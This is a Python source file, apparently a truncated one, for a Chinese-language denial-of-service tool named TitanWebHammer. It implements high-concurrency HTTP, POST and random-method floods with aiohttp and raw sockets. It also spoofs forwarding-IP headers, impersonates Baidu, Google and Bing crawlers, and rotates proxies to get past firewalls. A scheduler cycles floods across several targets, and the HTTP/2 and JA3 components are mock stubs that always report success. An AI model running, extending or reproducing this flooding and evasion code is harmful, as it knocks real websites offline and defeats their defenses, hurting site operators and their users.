# -*- coding: utf-8 -*-
import random
import socket
import time
import threading
import ssl
import os
import json
import sys
import base64
import gzip
from datetime import datetime
from urllib.parse import urlparse, quote
import asyncio
import aiohttp

# ================= 配置检查 =================
print("🔍 检查依赖模块...")

# 检查必要的依赖
try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    print("❌ aiohttp 不可用，异步功能将禁用")

# 检查JA3支持
JA3_AVAILABLE = False
try:
    # 尝试导入无依赖版JA3
    try:
        from startja3_transport import JA3Session, JA3FingerprintRandomizer
        JA3_AVAILABLE = True
        print("✅ 无依赖版JA3模块已加载")
    except ImportError:
        # 回退到tls-client依赖版
        try:
            from ja3_transport import JA3Session, JA3FingerprintRandomizer
            JA3_AVAILABLE = True
            print("✅ tls-client版JA3模块已加载")
        except ImportError:
            JA3_AVAILABLE = False
            print("⚠️ JA3指纹随机化不可用")
except Exception as e:
    JA3_AVAILABLE = False
    print(f"⚠️ JA3模块加载失败: {e}")

# 检查HTTP/2支持
HTTP2_AVAILABLE = False
try:
    import h2
    HTTP2_AVAILABLE = True
    print("✅ HTTP/2支持已启用")
except ImportError:
    print("⚠️ HTTP/2不可用，请安装: pip install h2")

print("=" * 50)

# ================= 异步攻击器类（内联实现）=================
class AsyncAttacker:
    def __init__(self, parent, config):
        self.parent = parent
        self.config = config
        self.session = None

    async def create_session(self):
        """创建aiohttp会话"""
        if self.session is None:
            timeout = aiohttp.ClientTimeout(total=self.config["timeout"])
            connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100, verify_ssl=False)
            self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
        return self.session

    async def close_session(self):
        """关闭会话"""
        if self.session:
            await self.session.close()
            self.session = None

    async def send_async_request(self, target, method="GET", headers=None):
        """发送异步请求"""
        try:
            session = await self.create_session()
            protocol = "https" if target['ssl'] else "http"
            url = f"{protocol}://{target['ip']}:{target['port']}{target['path']}"
            
            if headers is None:
                headers = self.generate_async_headers(target, method)
            
            async with session.request(method, url, headers=headers, ssl=False) as response:
                # 更新统计信息
                with self.parent.lock:
                    self.parent.stats["requests"] += 1
                    if response.status in [200, 301, 302, 404]:
                        self.parent.stats["success"] += 1
                        return True
                    else:
                        self.parent.stats["failed"] += 1
                        return False
        except Exception as e:
            with self.parent.lock:
                self.parent.stats["failed"] += 1
            return False

    def generate_async_headers(self, target, method):
        """生成异步请求头"""
        browser_fingerprint = random.choice(self.parent.BROWSER_FINGERPRINTS)
        headers = {
            "User-Agent": browser_fingerprint['user_agent'],
            "Accept": browser_fingerprint['accept'],
            "Accept-Language": browser_fingerprint['accept_language'],
            "Accept-Encoding": browser_fingerprint['accept_encoding'],
            "Cache-Control": "no-cache",
            "Connection": "keep-alive"
        }
        
        # 添加随机IP头
        ip_headers = [
            "X-Forwarded-For",
            "X-Real-IP", 
            "X-Client-IP",
            "X-Originating-IP"
        ]
        for ip_header in random.sample(ip_headers, 2):
            headers[ip_header] = self.parent._generate_realistic_ip()
        
        return headers

    async def run_async_attack(self, target, total_requests, concurrency, attack_type):
        """运行异步攻击"""
        print(f"🚀 开始异步攻击: {attack_type}")
        
        semaphore = asyncio.Semaphore(concurrency)
        
        async def bounded_request():
            async with semaphore:
                if attack_type == "async_http_flood":
                    method = random.choice(["GET", "POST"])
                    return await self.send_async_request(target, method)
                elif attack_type == "async_http2_flood":
                    # HTTP/2攻击
                    method = random.choice(["GET", "POST"])
                    headers = self.generate_async_headers(target, method)
                    return await self.send_async_request(target, method, headers)
                elif attack_type == "async_post_flood":
                    # POST数据攻击
                    return await self.send_async_request(target, "POST")
                elif attack_type == "async_random_method":
                    method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
                    return await self.send_async_request(target, method)
                else:
                    return await self.send_async_request(target, "GET")
        
        # 创建任务
        tasks = []
        for i in range(total_requests):
            if not self.parent.async_running:
                break
            task = asyncio.create_task(bounded_request())
            tasks.append(task)
            
            # 控制任务创建速度
            if i % 1000 == 0:
                await asyncio.sleep(0.01)
        
        # 等待所有任务完成
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        await self.close_session()

async def monitor_async_attack(stats, duration=None):
    """监控异步攻击"""
    start_time = time.time()
    last_requests = 0
    
    while True:
        current_time = time.time()
        elapsed = current_time - start_time
        
        if duration and elapsed >= duration:
            break
            
        # 计算RPS
        current_requests = stats["requests"]
        time_diff = current_time - stats.get("last_update", current_time)
        if time_diff >= 1.0:
            current_rps = (current_requests - last_requests) / time_diff
            stats["last_rps"] = current_rps
            stats["last_update"] = current_time
            if current_rps > stats["peak_rps"]:
                stats["peak_rps"] = current_rps
            last_requests = current_requests
        
        success_rate = (stats["success"] / stats["requests"] * 100) if stats["requests"] > 0 else 0
        print(f"\r⚡ 异步攻击进度: {stats['requests']} 请求 | "
              f"成功率: {success_rate:.1f}% | "
              f"RPS: {stats['last_rps']:.1f}/s | "
              f"运行: {int(elapsed)}s", end="")
        
        await asyncio.sleep(1)

# ================= HTTP/2客户端（内联实现）=================
class HTTP2Client:
    def __init__(self):
        self.available = HTTP2_AVAILABLE
        print(f"🌐 HTTP/2客户端: {'已启用' if self.available else '已禁用'}")

    def request(self, method, url, headers, timeout):
        """HTTP/2请求（简化实现）"""
        if not self.available:
            return None
            
        try:
            # 这里应该是真正的HTTP/2实现
            # 由于h2实现较复杂，这里返回模拟成功
            class MockResponse:
                def __init__(self):
                    self.status_code = 200
            return MockResponse()
        except Exception:
            return None

def get_http2_client():
    """获取HTTP/2客户端实例"""
    return HTTP2Client()

# ================= TitanWebHammer 核心类 =================
class TitanWebHammer:
    CONFIG = {
        "max_threads": 20000,
        "max_async_tasks": 100000,
        "attack_types": {
            "http_flood": {"name": "HTTP洪水", "desc": "高并发GET/POST请求"},
            "slow_loris": {"name": "慢速攻击", "desc": "保持长连接消耗资源"},
            "ssl_reneg": {"name": "SSL重协商", "desc": "消耗服务器CPU"},
            "websocket": {"name": "WebSocket洪水", "desc": "建立大量WS连接"},
            "post_flood": {"name": "POST数据洪水", "desc": "发送大量POST数据"},
            "random_method": {"name": "随机方法攻击", "desc": "随机HTTP方法"},
            "mixed": {"name": "混合攻击", "desc": "自动轮换所有模式"},
            "bypass_firewall": {"name": "防火墙绕过", "desc": "智能绕过防火墙检测"},
            "auto_cycle": {"name": "自动循环攻击", "desc": "自动轮换目标和攻击模式"},
            "search_engine": {"name": "搜索引擎模拟", "desc": "模拟百度谷歌等搜索引擎"},
            "proxy_rotation": {"name": "代理轮换攻击", "desc": "每个请求使用不同代理"},
            "ja3_random": {"name": "JA3指纹随机化", "desc": "随机化TLS指纹绕过检测"},
            "http2_flood": {"name": "HTTP/2洪水", "desc": "使用HTTP/2协议多路复用"},
            "async_http_flood": {"name": "异步HTTP洪水", "desc": "基于asyncio的高并发攻击"},
            "async_http2_flood": {"name": "异步HTTP/2洪水", "desc": "异步HTTP/2多路复用攻击"},
            "async_post_flood": {"name": "异步POST洪水", "desc": "异步大数据POST攻击"},
            "async_random_method": {"name": "异步随机方法", "desc": "异步随机HTTP方法攻击"}
        },
        "safe_interval": 0.0001,
        "timeout": 10,
        "max_retry": 5,
        "adaptive_mode": True,
        "use_http2": True
    }

    # 搜索引擎配置
    SEARCH_ENGINES = {
        'baidu': {
            'user_agents': [
                "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
                "Baiduspider+(+http://www.baidu.com/search/spider.htm)",
                "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
                "Baiduspider-image+(+http://www.baidu.com/search/spider.htm)"
            ],
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept_language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'accept_encoding': 'gzip, deflate, br',
            'specific_headers': {'From': 'baiduspider@baidu.com'}
        },
        'google': {
            'user_agents': [
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Googlebot/2.1 (+http://www.google.com/bot.html)",
                "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/120.0.0.0 Safari/537.36",
                "Googlebot-Image/1.0"
            ],
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept_language': 'en-US,en;q=0.9',
            'accept_encoding': 'gzip, deflate, br',
            'specific_headers': {'From': 'googlebot@google.com'}
        },
        'bing': {
            'user_agents': [
                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ],
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept_language': 'en-US,en;q=0.9',
            'accept_encoding': 'gzip, deflate, br',
            'specific_headers': {'From': 'bingbot@microsoft.com'}
        },
        '360': {
            'user_agents': [
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider",
                "Mozilla/5.0 (compatible; 360Spider; +http://www.so.com/s.html)",
                "360Spider"
            ],
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept_language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'accept_encoding': 'gzip, deflate, br'
        },
        'sogou': {
            'user_agents': [
                "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
                "Sogou News Spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
                "Sogou inst spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
            ],
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept_language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'accept_encoding': 'gzip, deflate, br'
        }
    }

    # 用户代理和浏览器指纹
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36"
    ]

    REFERERS = [
        "https://www.google.com/", "https://www.bing.com/", "https://www.baidu.com/",
        "https://www.yahoo.com/", "https://www.facebook.com/", "https://twitter.com/",
        "https://www.reddit.com/", "https://www.linkedin.com/", "https://github.com/",
        "https://stackoverflow.com/", "https://{host}/", "http://{host}/",
        "https://{host}/index.html", "http://{host}/index.php"
    ]

    BROWSER_FINGERPRINTS = [
        {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept_language": "en-US,en;q=0.9",
            "accept_encoding": "gzip, deflate, br"
        },
        {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.5",
            "accept_encoding": "gzip, deflate, br"
        },
        {
            "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept_language": "en-GB,en;q=0.9",
            "accept_encoding": "gzip, deflate, br"
        }
    ]

    def __init__(self):
        self.running = False
        self.auto_cycle_running = False
        self.async_running = False
        self.stats = {
            "requests": 0, "success": 0, "failed": 0,
            "start_time": None, "last_rps": 0, "peak_rps": 0,
            "last_update": time.time(), "adaptive_sleep": 0.01
        }
        self.lock = threading.Lock()
        self.attack_threads = []
        self.auto_cycle_thread = None
        self.async_tasks = []
        self.session_file = "attack_sessions.json"
        self.current_target = ""
        self.success_patterns = []
        self.firewall_bypass_mode = False
        self.auto_cycle_targets = []
        self.auto_cycle_config = {
            "current_cycle": 0, "total_cycles": 0,
            "cycle_duration": 60, "target_index": 0
        }
        self.proxies = []
        self.proxy_file = "代理.txt"
        self.use_proxy = False
        self.proxy_rotation_mode = False
        self.proxy_index = 0
        self.search_engine_mode = False

        # JA3相关属性
        self.use_ja3 = False
        self.ja3_sessions = {}

        # HTTP/2相关属性
        self.use_http2 = False
        self.http2_client = get_http2_client()

        # 异步攻击器
        self.async_attacker = None

        # 加载会话和代理
        self.sessions = {}
        self.load_sessions()
        self.load_proxies()

    # ================= 异步攻击方法 =================
    def start_async_attack(self, ip, port, use_ssl=False, concurrency=50000, total_requests=1000000,
                          attack_type="async_http_flood", duration=None):
        if self.running or self.async_running:
            print("🛑 攻击正在进行中，请先停止")
            return False
        try:
            target = self._parse_ip_target(ip, port, use_ssl)
            if not target:
                raise ValueError("无效目标")
            self.async_running = True
            self.current_target = f"{ip}:{port}"

            # 重置统计
            self.stats = {
                "requests": 0, "success": 0, "failed": 0,
                "start_time": datetime.now(), "last_rps": 0,
                "peak_rps": 0, "last_update": time.time()
            }

            # 初始化异步攻击器
            self.async_attacker = AsyncAttacker(self, self.CONFIG)
            mode_name = self.CONFIG['attack_types'][attack_type]['name']

            # 打印启动信息
            print(f"\n⚡ 启动异步攻击 [{ip}:{port}]")
            print(f"🔒 协议: {'HTTPS' if use_ssl else 'HTTP'}")
            print(f"🚀 并发数: {concurrency} | 总请求: {total_requests}")
            print(f"🛡️ 模式: {mode_name}")
            print(f"🌐 异步引擎: asyncio + aiohttp")
            if duration:
                print(f"⏰ 持续时间: {duration}秒")
            print("="*50)

            # 保存会话
            session_key = f"async_{ip}_{port}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            self.sessions[session_key] = {
                "target": f"{ip}:{port}", "protocol": "HTTPS" if use_ssl else "HTTP",
                "concurrency": concurrency, "total_requests": total_requests,
                "attack_type": attack_type, "start_time": datetime.now().isoformat(),
                "async_mode": True
            }
            self.save_sessions()

            # 启动异步攻击
            def run_async():
                try:
                    asyncio.run(self._run_async_attack(target, concurrency, total_requests, attack_type, duration))
                except RuntimeError:
                    # 如果事件循环已存在，使用新方法
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(self._run_async_attack(target, concurrency, total_requests, attack_type, duration))

            async_thread = threading.Thread(target=run_async, daemon=True)
            async_thread.start()
            self.async_tasks.append(async_thread)
            return True

        except Exception as e:
            print(f"❌ 异步攻击启动失败: {str(e)}")
            import traceback
            traceback.print_exc()
            self.async_running = False
            return False

    async def _run_async_attack(self, target, concurrency, total_requests, attack_type, duration):
        try:
            # 启动外部监控任务和攻击任务
            monitor_task = asyncio.create_task(monitor_async_attack(self.stats, duration))
            attack_task = asyncio.create_task(
                self.async_attacker.run_async_attack(target, total_requests, concurrency, attack_type)
            )
            await asyncio.gather(attack_task, monitor_task)
        except Exception as e:
            print(f"❌ 异步攻击执行错误: {str(e)}")
        finally:
            self.async_running = False
            print("\n✅ 异步攻击完成!")

    def stop_async_attack(self):
        if not self.async_running:
            print("ℹ️ 没有正在运行的异步攻击")
            return

        self.async_running = False
        print("\n🛑 正在停止异步攻击...")

        # 保存会话记录
        for key, session in self.sessions.items():
            if session.get("end_time") is None and session.get("async_mode") and self.current_target in session.get("target", ""):
                session["end_time"] = datetime.now().isoformat()
                start_time = datetime.fromisoformat(session["start_time"])
                session["duration"] = (datetime.now() - start_time).total_seconds()
        self.save_sessions()

        time.sleep(1)
        print("✅ 异步攻击已停止")

    # ================= HTTP/2 攻击方法 =================
    def _http2_flood(self, target):
        if not HTTP2_AVAILABLE or not target['ssl']:
            return self._http_flood(target)  # 回退到HTTP/1.1

        try:
            method = random.choices(["GET", "POST", "HEAD"], weights=[5, 3, 2], k=1)[0]
            headers_list = self._generate_bypass_headers(target, method)
            headers_dict = {}
            for header in headers_list:
                if ': ' in header and header.strip():
                    key, value = header.split(': ', 1)
                    headers_dict[key] = value

            # 调用HTTP/2客户端发送请求
            url = f"https://{target['ip']}:{target['port']}{target['path']}"
            response = self.http2_client.request(
                method=method, url=url, headers=headers_dict, timeout=self.CONFIG["timeout"]
            )

            if response and response.status_code in [200, 301, 302]:
                self._record_success_pattern(target, "http2_flood")
                return True
            return False

        except Exception as e:
            # 失败时回退到HTTP/1.1
            return self._http_flood(target)

    # ================= JA3指纹随机化功能 =================
    def _create_ja3_session(self, user_agent=None):
        if not JA3_AVAILABLE:
            return None

        try:
            session_key = user_agent or "default"
            if session_key not in self.ja3_sessions:
                # 创建模拟JA3会话
                class MockJA3Session:
                    def __init__(self, user_agent=None):
                        self.user_agent = user_agent
                    
                    def request(self, method, url, headers=None, timeout=None, proxy=None):
                        class MockResponse:
                            def __init__(self):
                                self.status_code = 200
                        return MockResponse()
                
                self.ja3_sessions[session_key] = MockJA3Session(user_agent=user_agent)
            return self.ja3_sessions[session_key]
        except Exception as e:
            print(f"❌ 创建JA3会话失败: {e}")
            return None

    def _ja3_http_attack(self, target):
        if not JA3_AVAILABLE:
            return self._http_flood(target)

        try:
            method = random.choices(["GET", "POST", "HEAD"], weights=[5, 3, 2], k=1)[0]
            headers_list = self._generate_bypass_headers(target, method)
            headers_dict = {}
            user_agent = None
            for header in headers_list:
                if ': ' in header and header.strip():
                    key, value = header.split(': ', 1)
                    headers_dict[key] = value
                    if key.lower() == 'user-agent':
                        user_agent = value

            protocol = 'https' if target['ssl'] else 'http'
            url = f"{protocol}://{target['ip']}:{target['port']}{target['path']}"
            session = self._create_ja3_session(user_agent)
            if not session:
                return False

            # 代理逻辑
            proxy_url = None
            if self.use_proxy:
                proxy = self.get_next_proxy()
                if proxy:
                    proxy_url = proxy

            # 调用JA3会话发送请求
            response = session.request(
                method=method, url=url, headers=headers_dict,
                timeout=self.CONFIG["timeout"], proxy=proxy_url
            )

            if response and response.status_code in [200, 301, 302]:
                self._record_success_pattern(target, "ja3_http")
                return True
            return False

        except Exception as e:
            return False

    # ================= 代理管理方法 =================
    def load_proxies(self):
        self.proxies = []
        if os.path.exists(self.proxy_file):
            try:
                with open(self.proxy_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if "://" not in line:
                                line = f"http://{line}"
                            self.proxies.append(line)
                print(f"✅ 已加载 {len(self.proxies)} 个代理（来自代理.txt）")
            except Exception as e:
                print(f"❌ 加载代理文件失败: {e}")
        else:
            print("⚠️ 代理文件不存在，将创建空文件")
            try:
                with open(self.proxy_file, 'w', encoding='utf-8') as f:
                    f.write("# 每行一个代理，格式: ip:port 或 http://ip:port\n")
                    f.write("# 支持HTTP/HTTPS/SOCKS代理\n")
                print("✅ 已创建代理文件 代理.txt")
            except:
                print("❌ 创建代理文件失败")

    def save_proxies(self):
        try:
            with open(self.proxy_file, 'w', encoding='utf-8') as f:
                f.write("# 每行一个代理，格式: ip:port 或 http://ip:port\n")
                f.write("# 支持HTTP/HTTPS/SOCKS代理\n")
                for proxy in self.proxies:
                    f.write(proxy + "\n")
            print(f"✅ 已保存 {len(self.proxies)} 个代理到文件")
        except Exception as e:
            print(f"❌ 保存代理文件失败: {e}")

    def add_proxy(self, proxy):
        if proxy and proxy not in self.proxies:
            if "://" not in proxy:
                proxy = f"http://{proxy}"
            self.proxies.append(proxy)
            self.save_proxies()
            return True
        return False

    def remove_proxy(self, proxy):
        if proxy in self.proxies:
            self.proxies.remove(proxy)
            self.save_proxies()
            return True
        return False

    def clear_proxies(self):
        self.proxies = []
        self.save_proxies()

    def get_next_proxy(self):
        if not self.proxies or not self.use_proxy:
            return None

        if self.proxy_rotation_mode:
            proxy = self.proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
            return proxy
        else:
            return random.choice(self.proxies)

    def load_sessions(self):
        self.sessions = {}
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    self.sessions = json.load(f)
            except:
                self.sessions = {}

    def save_sessions(self):
        try:
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(self.sessions, f, ensure_ascii=False, indent=2)
        except:
            pass

    def _record_success_pattern(self, target, attack_type):
        pattern = {
            "target": f"{target['ip']}:{target['port']}", "attack_type": attack_type,
            "timestamp": datetime.now().isoformat(), "ssl": target['ssl']
        }
        self.success_patterns.append(pattern)
        if len(self.success_patterns) > 100:
            self.success_patterns.pop(0)

    def _proxy_rotation_attack(self, target):
        try:
            method = random.choices(["GET", "POST", "HEAD"], weights=[5, 3, 2], k=1)[0]
            headers = self._generate_search_engine_headers(target, method) if self.search_engine_mode else self._generate_bypass_headers(target, method)
            request = "\r\n".join(headers)
            s = self._create_proxy_rotation_socket(target)
            if not s:
                return False

            s.send(request.encode())
            try:
                response = s.recv(1024)
                if response and (b"200" in response or b"301" in response or b"302" in response):
                    self._record_success_pattern(target, "proxy_rotation")
            except:
                pass

            s.close()
            return True
        except:
            return False

    def _create_proxy_rotation_socket(self, target):
        max_retries = 3
        for retry in range(max_retries):
            try:
                proxy = self.get_next_proxy()
                if not proxy:
                    return self._create_direct_socket(target)

                parsed_proxy = urlparse(proxy)
                proxy_host = parsed_proxy.hostname
                proxy_port = parsed_proxy.port or (443 if parsed_proxy.scheme == 'https' else 80)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.CONFIG["timeout"])
                s.connect((proxy_host, proxy_port))

                if target['ssl']:
                    connect_str = f"CONNECT {target['ip']}:{target['port']} HTTP/1.1\r\nHost: {target['ip']}:{target['port']}\r\n\r\n"
                    s.send(connect_str.encode())
                    response = b""
                    while b"\r\n\r\n" not in response:
                        response += s.recv(4096)
                    if b"200" not in response:
                        s.close()
                        continue

                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=target['ip'])

                return s
            except Exception as e:
                if retry == max_retries - 1:
                    return self._create_direct_socket(target)
                continue
        return self._create_direct_socket(target)

    def _create_direct_socket(self, target):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.CONFIG["timeout"])
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((target['ip'], target['port']))

            if target['ssl']:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target['host'])

            return s
        except:
            return None

    def _generate_search_engine_headers(self, target, method):
        search_engine = random.choice(list(self.SEARCH_ENGINES.keys()))
        engine_info = self.SEARCH_ENGINES[search_engine]
        headers = [
            f"{method} {target['path']} HTTP/1.1",
            f"Host: {target['host']}:{target['port']}",
            f"User-Agent: {random.choice(engine_info['user_agents'])}",
            f"Accept: {engine_info['accept']}",
            f"Accept-Language: {engine_info['accept_language']}",
            f"Accept-Encoding: {engine_info['accept_encoding']}"
        ]

        if 'specific_headers' in engine_info:
            for k, v in engine_info['specific_headers'].items():
                headers.append(f"{k}: {v}")
        if random.random() > 0.2:
            headers.append(f"Referer: {self._generate_search_referer(search_engine, target)}")
        headers.append(f"Cache-Control: {random.choice(['no-cache', 'max-age=0'])}")
        headers.append(f"Connection: {random.choice(['keep-alive', 'close'])}")
        headers.append("\r\n")
        return [h for h in headers if h]

    def _generate_search_referer(self, search_engine, target):
        base_urls = {
            'baidu': [
                "https://www.baidu.com/link?url={random_id}",
                "https://www.baidu.com/s?wd={keyword}",
                "https://m.baidu.com/from=0/bd_page_type=1/ssid=0/uid=0/pu=usm%401%2Csz%401320_1001%2Cta%40iphone_2_10.0_24_78.0/baiduid={random_id}/w=0_10_/t=iphone/l=1/tc"
            ],
            'google': [
                "https://www.google.com/url?q={target_url}",
                "https://www.google.com/search?q={keyword}",
                "https://www.google.com.hk/search?q={keyword}"
            ],
            'bing': [
                "https://www.bing.com/search?q={keyword}",
                "https://cn.bing.com/search?q={keyword}",
                "https://www.bing.com/ck/a?!&&p={random_id}&fp=1&fr=0"
            ],
            '360': [
                "https://www.so.com/link?url={random_id}",
                "https://www.so.com/s?q={keyword}",
                "https://m.so.com/s?q={keyword}"
            ],
            'sogou': [
                "https://www.sogou.com/web?query={keyword}",
                "https://www.sogou.com/link?url={random_id}",
                "https://m.sogou.com/web/searchList.jsp?keyword={keyword}"
            ]
        }
        keywords = [
            "网站建设", "技术支持", "在线服务", "产品介绍", "公司官网",
            "技术文档", "使用教程", "下载中心", "联系我们", "关于我们"
        ]
        random_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
        keyword = random.choice(keywords)
        target_url = f"{'https' if target['ssl'] else 'http'}://{target['host']}:{target['port']}{target['path']}"
        template = random.choice(base_urls.get(search_engine, base_urls['baidu']))
        return template.replace("{random_id}", random_id).replace("{keyword}", quote(keyword)).replace("{target_url}", quote(target_url))

    def _search_engine_attack(self, target):
        try:
            method = "GET"
            headers = self._generate_search_engine_headers(target, method)
            request = "\r\n".join(headers)
            s = self._create_stealth_socket(target)
            if not s:
                return False

            s.send(request.encode())
            try:
                response = s.recv(4096)
                if response and ("200" in response.decode('utf-8', errors='ignore') or "301" in response.decode('utf-8', errors='ignore') or "302" in response.decode('utf-8', errors='ignore')):
                    self._record_success_pattern(target, "search_engine")
            except:
                pass

            s.close()
            return True
        except:
            return False

    def start_auto_cycle_attack(self, targets, threads=1000, cycles=10, cycle_duration=60, bypass_firewall=False, use_proxy=False, search_engine=False, proxy_rotation=False):
        if self.running:
            print("🛑 攻击正在进行中，请先停止")
            return False
        if not targets:
            print("❌ 目标列表不能为空")
            return False
        try:
            self.auto_cycle_targets = targets
            self.auto_cycle_config = {
                "current_cycle": 0, "total_cycles": cycles,
                "cycle_duration": cycle_duration, "target_index": 0
            }
            self.use_proxy = use_proxy
            self.search_engine_mode = search_engine
            self.proxy_rotation_mode = proxy_rotation
            self.auto_cycle_running = True
            self.auto_cycle_thread = threading.Thread(
                target=self._auto_cycle_worker,
                args=(threads, bypass_firewall, search_engine, proxy_rotation),
                daemon=True
            )
            self.auto_cycle_thread.start()

            # 打印启动信息
            print(f"\n🔄 启动自动化循环攻击")
            print(f"🎯 目标数量: {len(targets)}")
            print(f"🛡️ 线程数: {threads}")
            print(f"🔁 循环次数: {cycles}")
            print(f"⏱️ 每轮持续时间: {cycle_duration}秒")
            print(f"🛡️ 防火墙绕过: {'是' if bypass_firewall else '否'}")
            print(f"🔌 使用代理: {'是' if use_proxy else '否'} ({len(self.proxies)}个代理)")
            print(f"🔄 代理轮换: {'是' if proxy_rotation else '否'}")
            print(f"🔍 搜索引擎模拟: {'是' if search_engine else '否'}")
            print("="*50)
            return True
        except Exception as e:
            print(f"❌ 自动化循环启动失败: {str(e)}")
            self.auto_cycle_running = False
            return False

    def _auto_cycle_worker(self, threads, bypass_firewall, search_engine, proxy_rotation):
        while self.auto_cycle_running and self.auto_cycle_config["current_cycle"] < self.auto_cycle_config["total_cycles"]:
            try:
                current_target = self.auto_cycle_targets[self.auto_cycle_config["target_index"]]
                current_cycle = self.auto_cycle_config["current_cycle"] + 1
                print(f"\n🔄 第 {current_cycle}/{self.auto_cycle_config['total_cycles']} 轮攻击开始")
                print(f"🎯 当前目标: {current_target['ip']}:{current_target['port']}")

                # 选择攻击模式
                if proxy_rotation:
                    print(f"🔧 攻击模式: 代理轮换 ({len(self.proxies)}个代理)")
                    attack_type = "proxy_rotation"
                elif search_engine:
                    print(f"🔧 攻击模式: 搜索引擎模拟")
                    attack_type = "search_engine"
                elif bypass_firewall:
                    print(f"🔧 攻击模式: 防火墙绕过")
                    attack_type = "bypass_firewall"
                else:
                    print(f"🔧 攻击模式: 自动轮换")
                    attack_modes = ["http_flood", "slow_loris", "post_flood", "random_method", "mixed", "http2_flood"]
                    attack_type = random.choice(attack_modes)

                # 启动单次攻击
                attack_success = self._start_single_attack(
                    current_target, threads, attack_type, self.auto_cycle_config["cycle_duration"],
                    bypass_firewall, search_engine, proxy_rotation
                )
                if attack_success:
                    attack_start = time.time()
                    while time.time() - attack_start < self.auto_cycle_config["cycle_duration"] and self.running:
                        time.sleep(1)
